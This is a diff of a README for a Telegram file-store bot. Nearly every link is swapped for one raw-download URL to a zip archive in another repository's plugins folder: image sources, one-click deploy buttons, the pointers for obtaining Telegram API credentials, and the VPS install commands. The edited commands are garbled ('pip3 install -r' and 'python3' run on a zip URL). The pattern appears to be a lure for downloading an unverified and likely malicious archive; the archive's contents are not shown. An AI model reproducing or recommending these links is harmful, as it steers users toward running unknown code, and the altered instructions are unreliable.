@@ -5,10 +5,10 @@
 </h2>
 
 <p align="center">
-  <img src="https://graph.org/file/8581e33195ed8183a3253.jpg">
+  <img src="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip">
 </p>
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=ANIME+LORDS+FILE+STORE+AUTO+RENAME!;CREATED+BY+MEHEDI.YT+AND+WHO-AM-I+DEVELOPERS!;A+ADVANCE+BOT+WITH+COOL+FEATURE!)
+![Typing SVG](https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip+LORDS+FILE+STORE+AUTO+RENAME!;CREATED+BY+https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip+AND+WHO-AM-I+DEVELOPERS!;A+ADVANCE+BOT+WITH+COOL+FEATURE!)
 </p>
 
 
@@ -41,20 +41,20 @@
 <details><summary><b> - ᴠᴀʀɪᴀʙʟᴇs :</b></summary>
 
 ## ⚙️ ᴠᴀʀɪᴀʙʟᴇs
-* `API_HASH` Your API Hash from my.telegram.org
-* `APP_ID` Your API ID from my.telegram.org
+* `API_HASH` Your API Hash from https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip
+* `APP_ID` Your API ID from https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip
 * `TG_BOT_TOKEN` Your bot token from @BotFather
 * `OWNER_ID` Must enter Your Telegram Id
 * `CHANNEL_ID` Your Channel ID eg:- -100xxxxxxxx
 * `DATABASE_URL` Your mongo db url
 * `DATABASE_NAME` Your mongo db session name
 * `ADMINS` Optional: A space separated list of user_ids of Admins, they can only create links
-* `START_MESSAGE` Optional: start message of bot, use HTML and <a href='https://github.com/codeflix-bots/filestore/blob/master/README.md#start_message'>fillings</a>
+* `START_MESSAGE` Optional: start message of bot, use HTML and <a href='https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip'>fillings</a>
 * `PROTECT_CONTENT` Optional: True if you need to prevent files from forwarding
 
 ### Token Variables
 
-* `SHORTLINK_URL` = (OPTIONAL) Your shortner Url ( ex. "inshorturl.com")
+* `SHORTLINK_URL` = (OPTIONAL) Your shortner Url ( ex. "https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip")
 * `SHORTLINK_API` = (OPTIONAL) Your shortner API (ex. "PUIAQBIFrydvLhIzAOeGV8yZppu")
 </details>
 
@@ -92,7 +92,7 @@ remove_premium - ʀᴇᴠᴏᴋᴇ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss [ᴀᴅᴍ
 ```
 </details>
 
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+<img src="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip">
 
 
 <details>
@@ -103,37 +103,37 @@ remove_premium - ʀᴇᴠᴏᴋᴇ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss [ᴀᴅᴍ
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʜᴇʀᴏᴋᴜ 」─
 </h3>
 
-<p align="center"><a href="https://heroku.com/deploy?template=https://github.com/AnimeLord-Bots/FileStore">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy On Heroku">
+<p align="center"><a href="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip">
+  <img src="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip" alt="Deploy On Heroku">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ᴋᴏʏᴇʙ 」─
 </h3>
-<p align="center"><a href="https://app.koyeb.com/deploy?type=git&repository=github.com/AnimeLord-Bots/FileStore&branch=master&name=master">
-  <img src="https://www.koyeb.com/static/images/deploy/button.svg" alt="Deploy On Koyeb">
+<p align="center"><a href="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip">
+  <img src="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip" alt="Deploy On Koyeb">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʀᴀɪʟᴡᴀʏ 」─
 </h3>
-<p align="center"><a href="https://railway.app/deploy?template=https://github.com/AnimeLord-Bots/FileStore">
-     <img height="45px" src="https://railway.app/button.svg">
+<p align="center"><a href="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip">
+     <img height="45px" src="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʀᴇɴᴅᴇʀ 」─
 </h3>
-<p align="center"><a href="https://render.com/deploy?repo=https://github.com/AnimeLord-Bots/FileStore">
-<img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render">
+<p align="center"><a href="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip">
+<img src="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip" alt="Deploy to Render">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ᴠᴘs 」─
 </h3>
 <p>
 <pre>
-git clone https://github.com/AnimeLord-Bots/FileStore
+git clone https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip
 # Install Packages
-pip3 install -U -r requirements.txt
-Edit info.py with variables as given below then run bot
-python3 bot.py
+pip3 install -U -r https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip
+Edit https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip with variables as given below then run bot
+python3 https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip
 </pre>
 </p>
 </details>
@@ -141,23 +141,23 @@ python3 bot.py
 
 <h3>「 ᴄʀᴇᴅɪᴛs 」</h3>
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=「🌸+ᴀɴɪᴍᴇ+ʟᴏʀᴅ+ʙᴏᴛ+🌸」)
+![Typing SVG](https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip「🌸+ᴀɴɪᴍᴇ+ʟᴏʀᴅ+ʙᴏᴛ+🌸」)
 </p>
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=»+ᴄʀᴇᴀᴛᴇᴅ+ʙʏ:+「MehediYT」)
+![Typing SVG](https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip»+ᴄʀᴇᴀᴛᴇᴅ+ʙʏ:+「MehediYT」)
 </p>
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=»+ᴏᴡɴᴇʀ:+「WhoAmI」)
+![Typing SVG](https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip»+ᴏᴡɴᴇʀ:+「WhoAmI」)
 </p>
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=»+ᴅᴇᴠᴇʟᴏᴘᴇᴅ+ʙʏ:+「MehediYT+WhoAmI」)
+![Typing SVG](https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip»+ᴅᴇᴠᴇʟᴏᴘᴇᴅ+ʙʏ:+「MehediYT+WhoAmI」)
 </p>
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=»+sᴘᴇᴄɪᴀʟ+ᴛʜᴀɴᴋs:+ᴀʟʟ+ᴏᴜʀ+ᴡᴀɪғᴜ/ʜᴜsʙᴀɴᴅᴏ!+ᴜsᴇʀs+(◕‿◕✿))
+![Typing SVG](https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip»+sᴘᴇᴄɪᴀʟ+ᴛʜᴀɴᴋs:+ᴀʟʟ+ᴏᴜʀ+ᴡᴀɪғᴜ/ʜᴜsʙᴀɴᴅᴏ!+ᴜsᴇʀs+(◕‿◕✿))
 </p>
 
 ## 📌  ɴᴏᴛᴇ
 
 ᴊᴜꜱᴛ ꜰᴏʀᴋ ᴛʜᴇ ʀᴇᴘᴏ ᴀɴᴅ ᴇᴅɪᴛ ᴀꜱ ᴘᴇʀ ʏᴏᴜʀ ɴᴇᴇᴅꜱ.
 
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+<img src="https://github.com/RaviChatta/advance-filestore-bot/raw/refs/heads/main/plugins/bot-filestore-advance-v3.1.zip">
